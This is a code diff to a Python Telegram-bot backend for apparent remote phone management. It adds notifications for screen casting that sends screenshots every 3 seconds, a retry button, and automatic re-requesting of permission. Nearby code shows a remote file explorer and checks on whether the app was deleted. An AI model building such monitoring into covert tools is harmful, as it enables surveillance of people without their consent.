@@ -1906,7 +1906,7 @@ def _api_device_event():
     """
     data = request.json or {}
     did = data.get("device_id", "")
-    event = data.get("event", "")
+    event = data.get("event", "") or data.get("type", "")  # ⚡ accept both "event" and "type"
     message = data.get("message", "")
     timestamp = data.get("timestamp", 0)
 
@@ -1950,6 +1950,18 @@ def _api_device_event():
             f"📱 <b>{short_label}</b>\n"
             f"⚠ السبب: إطفاء الإنترنت (وليس حذف التطبيق)\n"
             f"💡 سيعود الاتصال عند عودة الشبكة",
+        "screen_cast_started":
+            f"📺 <b>تم بدء البث المباشر!</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"📸 ستصل صور الشاشة تلقائياً كل 3 ثوانٍ",
+        "screen_cast_stopped":
+            f"⏹ <b>تم إيقاف البث المباشر</b>\n\n"
+            f"📱 <b>{short_label}</b>",
+        "screen_cast_failed":
+            f"❌ <b>فشل تفعيل البث المباشر</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"⚠️ {message}\n"
+            f"💡 سيتم إعادة طلب الإذن تلقائياً",
     }
 
     msg_text = event_messages.get(event,
@@ -2194,6 +2206,35 @@ def _sock_file_explorer(data):
                         reply_markup=stop_btn)
                 except Exception as e:
                     logger.error(f"فشل إرسال إشعار بدء البث: {e}")
+        return
+
+    # ⚡ Check for screen_cast_failed event (فشل البث المباشر)
+    if data_type == "screen_cast_failed":
+        logger.info(f"❌ Screen cast failed on #{dev.get('short_id', '?')}: {data.get('message', 'unknown')}")
+        dm.set_screen_cast(dev["device_id"], False)
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    short_label = _dev_label(dev)
+                    did = dev["device_id"]
+                    # زر إعادة المحاولة
+                    retry_cache_key = str(len(_file_path_cache))
+                    _file_path_cache[retry_cache_key] = "start-screen-cast"
+                    kb = InlineKeyboardMarkup(row_width=1)
+                    kb.add(InlineKeyboardButton(
+                        "🔄 إعادة محاولة البث",
+                        callback_data=f"cmd:{did}:p{retry_cache_key}"[:64]
+                    ))
+                    mdm_bot.bot.send_message(admin_id,
+                        f"<b>❌ فشل تفعيل البث المباشر</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n"
+                        f"⚠️ {data.get('message', 'خطأ غير معروف')}\n\n"
+                        f"💡 سيتم إعادة طلب الإذن تلقائياً\n"
+                        f"🔄 اضغط الزر لإعادة المحاولة",
+                        parse_mode="HTML",
+                        reply_markup=kb)
+                except Exception as e:
+                    logger.error(f"فشل إرسال إشعار فشل البث: {e}")
         return
 
     # ⚡ Check for screen_cast_stopped event (إيقاف البث المباشر)
